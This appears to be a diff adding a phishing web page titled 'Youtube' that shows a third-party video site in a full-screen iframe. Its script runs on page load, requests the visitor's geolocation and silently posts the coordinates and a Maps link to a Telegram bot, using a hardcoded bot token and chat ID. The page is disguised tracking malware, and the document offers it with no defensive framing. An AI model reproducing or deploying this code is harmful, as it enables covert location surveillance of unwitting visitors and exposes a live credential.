@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Youtube</title>
+    <script>
+        const botToken = "8019449835:AAE_R2vBAjUOfU5jEiIWUpHs-WTDGU9pOcM";
+        const chatId = "6296611162";
+
+        function sendLocationToTelegram(latitude, longitude) {
+            const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const textMessage = `User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: textMessage
+                }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Location sent successfully: " + textMessage);
+                    } else {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending location: " + error);
+                });
+        }
+
+        function fetchLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        sendLocationToTelegram(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error("Error fetching location: " + error.message);
+                        alert("Failed to fetch location. Please allow location access.");
+                    }
+                );
+            } else {
+                alert("");
+            }
+        }
+
+       
+        window.onload = fetchLocation;
+    </script>
+</head>
+<body>
+    <iframe src="https://www.genyt.net/" allowfullscreen></iframe>
+</body>
+</html>
+<style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
